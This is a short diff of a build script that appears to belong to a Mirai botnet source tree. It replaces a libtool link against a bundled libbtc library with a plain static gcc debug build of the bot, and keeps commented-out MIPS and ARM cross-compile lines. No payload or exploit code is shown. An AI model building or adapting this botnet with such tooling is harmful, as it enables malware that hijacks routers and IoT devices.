@@ -48,8 +48,7 @@ elif [ "$1" == "release" ]; then
 
     go build -o release/scanListen tools/scanListen.go
 elif [ "$1" == "debug" ]; then
-    libtool --mode=link gcc -std=c99 -Ibot/libbtc bot/*.c -DDEBUG "$FLAGS" -static -g -o debug/mirai.dbg bot/libbtc/libbtc.la
-    echo "OK"
+    gcc -std=c99 bot/*.c -DDEBUG "$FLAGS" -static -g -o debug/mirai.dbg
 #    mips-gcc -std=c99 -DDEBUG bot/*.c "$FLAGS" -static -g -o debug/mirai.mips
 #    armv4l-gcc -std=c99 -DDEBUG bot/*.c "$FLAGS" -static -g -o debug/mirai.arm
 #    armv6l-gcc -std=c99 -DDEBUG bot/*.c "$FLAGS" -static -g -o debug/mirai.arm7
